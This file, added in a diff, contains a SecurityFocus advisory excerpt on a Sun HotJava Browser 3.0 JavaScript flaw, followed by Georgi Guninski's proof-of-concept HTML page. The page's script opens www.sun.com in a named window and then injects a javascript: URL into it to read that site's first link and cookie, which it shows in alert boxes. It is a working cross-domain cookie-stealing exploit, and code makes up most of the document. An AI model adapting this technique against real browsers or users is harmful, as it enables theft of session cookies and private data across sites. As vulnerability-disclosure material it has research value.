@@ -1,0 +1,38 @@
+source: http://www.securityfocus.com/bid/1837/info
+
+A malicious website operator may be able to obtain cookies from a target system browsing with Sun HotJava Browser. 
+
+The Document Object Model (DOM) of arbitrary URLs can be accessed if a specially formed javascript is launched from a named window. Cookies that may contain sensitive information can be acquired through this method.
+
+<HTML>
+<HEAD>
+<TITLE>
+Demo - HotJava Browser 3.0 JavaScript security vulnerability
+</TITLE>
+</HEAD>
+<BODY>
+Demo - HotJava Browser 3.0 JavaScript security vulnerability
+<BR>
+This page shows the cookie and the first link from from www.sun.com in 10 seconds
+<BR>
+Written by Georgi Guninski
+<BR>
+
+<SCRIPT>
+window.open("http://www.sun.com","g");
+setTimeout("window.open('javascript:alert(\"The first link is: \"+document.links[0].href);alert(\"The cookie is: \"+document.cookie)','g')",10000);
+</SCRIPT>
+
+<center>(C) Copyright 2000 Georgi Guninski</center>
+<BR>
+<center>
+| <a href="http://www.guninski.com">Home</a> | 
+<a href="browsers.html">Internet Explorer</a> | 
+<a href="win2k.html">Windows 2000</a> | 
+<a href="exploit.html">AIX</a> | 
+<a href="netscape.html">Netscape</a> | 
+<a href="greets.html">Greets</a> | 
+<a href="index.html">More...</a> | 
+</center>
+</BODY>
+</HTML>
